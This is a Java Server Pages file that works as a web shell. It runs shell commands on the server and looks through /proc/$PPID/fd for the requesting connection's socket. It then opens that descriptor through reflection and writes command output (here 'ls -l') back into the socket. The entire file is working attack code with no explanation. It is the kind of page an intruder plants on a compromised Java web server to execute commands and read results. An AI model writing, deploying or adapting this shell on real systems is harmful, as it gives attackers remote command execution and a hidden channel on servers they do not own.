<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    String command  = "ls -al /proc/$PPID/fd|grep socket:|awk 'BEGIN{FS=\"[\"}''{print $2}'|sed 's/.$//'";
    String[] cmd = new String[]{"/bin/sh", "-c", command };
    java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
    java.io.InputStreamReader isr  = new java.io.InputStreamReader(in);
    java.io.BufferedReader br = new java.io.BufferedReader(isr);

    java.util.List<String> res1 = new java.util.ArrayList<>();
    String line = "";
    while ((line = br.readLine()) != null){
        res1.add(line);
    }

    isr.close();
    br.close();
    in.close();

    Thread.sleep(2000);

    command  = "ls -al /proc/$PPID/fd|grep socket:|awk '{print $9, $11}'";
    cmd = new String[]{"/bin/sh", "-c", command };
    in = Runtime.getRuntime().exec(cmd).getInputStream();
    isr  = new java.io.InputStreamReader(in);
    br = new java.io.BufferedReader(isr);

    java.util.List<String> res2 = new java.util.ArrayList<>();
    while ((line = br.readLine()) != null){
        res2.add(line);
    }

    isr.close();
    br.close();
    in.close();

    int index = 0;
    int max = 0;
    for(int i = 0; i < res1.size(); i++){
        for(int j = 0; j < res2.size(); j++){
            if(res2.get(j).contains(res1.get(i))){
                String socketNo = res2.get(j).split("\\s+")[1].substring(8);
                socketNo = socketNo.substring(0, socketNo.length() - 1);

                if(Integer.parseInt(socketNo) > max) {
                    max = Integer.parseInt(socketNo);
                    index = j;
                }
            }
        }
    }

    int fd = Integer.parseInt(res2.get(index).split("\\s")[0]);

    java.lang.reflect.Constructor<java.io.FileDescriptor> c= java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});
    c.setAccessible(true);

    cmd = new String[]{"/bin/sh", "-c", "ls -l" };
    in = Runtime.getRuntime().exec(cmd).getInputStream();
    isr  = new java.io.InputStreamReader(in);
    br = new java.io.BufferedReader(isr);

    StringBuilder sb = new StringBuilder();
    while ((line = br.readLine()) != null){
        sb.append(line + "\n");
    }

    java.io.FileOutputStream os = new java.io.FileOutputStream(c.newInstance(fd));
    os.write(sb.toString().getBytes());

    br.close();
    isr.close();
    in.close();
%>
</body>
</html>